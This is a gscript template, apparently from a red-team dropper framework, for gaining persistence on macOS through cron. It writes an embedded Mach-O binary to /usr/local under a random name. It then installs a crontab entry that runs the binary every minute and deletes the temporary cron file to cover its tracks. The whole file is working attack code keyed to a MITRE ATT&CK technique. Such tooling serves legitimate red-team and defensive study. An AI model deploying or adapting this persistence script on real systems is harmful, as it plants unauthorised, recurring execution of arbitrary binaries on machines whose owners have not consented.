// Example gscript template
// Title: Persistence_osx_cronjob
// Author: Jay Hill
// Purpose: cron job persistence on osx
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1168

//priority:150
//timeout:150

//go_import:os as os

//import:/private/tmp/example.macho
  
function Deploy() {  
    console.log("Start Cron Job on Osx");

    // Getting our asset
    var exampleBin = GetAssetAsBytes("example.macho");
    if (exampleBin[1] != null) {
        console.log("errors: "+exampleBin[1].Error());
    }
    
    // Getting a random filepathc
    //var temppath = os.TempDir();
    var temppath = "/usr/local";
    var naming = G.rand.GetAlphaString(5);
    naming = naming.toLowerCase();
    var fullpath = temppath+"/"+naming;
    console.log("file name: "+ fullpath);
    // Write file
    var errors = G.file.WriteFileFromBytes(fullpath, exampleBin[0]);
    if (errors != null) {
        console.log("errors: "+errors.Error());
    }

    // Cron Command
    var command = "* * * * * "+fullpath+"\n";
    // Write the Cron Command
    var cronfile = G.rand.GetAlphaNumericString(5);
    var tmpcron = os.TempDir();
    cronfile = tmpcron+"/"+cronfile.toLowerCase();   
    var error = G.file.WriteFileFromString(cronfile, command);
    if (error != null) {
        console.log("errors: "+error.Error());
    }

    // Issue the Cron Command
    cronexec = G.exec.ExecuteCommand("crontab", [cronfile]);
    console.log("Pid: "+cronexec[0]);
    console.log("stdout: "+cronexec[1])
    console.log("stderr: "+cronexec[2])
    console.log("exit code: "+cronexec[3])
    if (cronexec[4] != null) {
        console.log("go errors: "+Dump(cronexec[4]))  
    }

    // Remove Cron Command
    var err = os.Remove(cronfile);
    if (err != null) {
        console.log("errors: "+err.Error());
    }

    console.log("Done Cron Job on Osx");
    return true;
  }